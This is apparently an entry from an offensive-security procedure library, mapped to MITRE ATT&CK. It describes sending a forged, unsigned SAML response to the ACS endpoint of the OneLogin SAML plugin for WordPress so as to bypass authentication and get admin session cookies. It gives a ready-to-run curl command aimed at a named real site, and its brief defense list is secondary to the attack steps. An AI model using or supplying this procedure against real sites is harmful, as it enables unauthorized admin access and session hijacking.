---
tags:
  - saml
  - exploit
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-send-saml]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[External Remote Services]]'
updated_at: '2025-12-14T17:31:52.132Z'
sub_techniques: []
id: a54a4bbc-e1de-4f9b-80b9-17ad5ee7e451
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[External Remote Services]]'
---
# Send-Forged-SAML-Response

## Summary

This procedure submits the base64-encoded unsigned SAML response via HTTP POST to the ACS endpoint, triggering the authentication bypass in the OneLogin plugin.

## Description

The core exploitation step involves POSTing to the ACS with RelayState set to /wp-login.php and SAMLResponse as the encoded XML. The plugin's Response.php accepts it due to missing signature checks, creating or logging in the admin user and setting cookies. Targets WordPress sites; prerequisites: encoded response and endpoint; outcomes: authenticated session.

## Requirements

1. Valid ACS endpoint URL
2. Encoded SAMLResponse in variable
3. curl tool installed

## Defense

Defensive measures and detection strategies:

- Require signatures for all SAML responses
- Monitor POSTs to ACS for unsigned or malformed XML
- Implement rate limiting on authentication endpoints

## Objectives

1. Deliver forged response to plugin
2. Obtain authentication cookies
3. Achieve session hijack

## Instructions

### Step 1: Prepare POST Request

**Context**: Set up the curl command with parameters.

Ensure 'xml' variable holds the encoded response.

### Step 2: Execute POST

**Context**: Send the request to bypass auth.

**Command** ([[commands/curl-send-saml]]):

```bash
curl -v 'https://newsroom.uber.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs' --data "RelayState=/wp-login.php" --data-urlencode "SAMLResponse=$xml"
```

> Verbose output shows headers. Expected output: 302 redirect with cookies like wordpress_logged_in_*=...; Location: https://target.com/.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]
- [[External Remote Services]]

### Sub-Techniques


## Commands Used

- [[commands/curl-send-saml]]

## Tools Used

- [[tools/curl]]

## Tags

- [[saml]]
- [[exploit]]
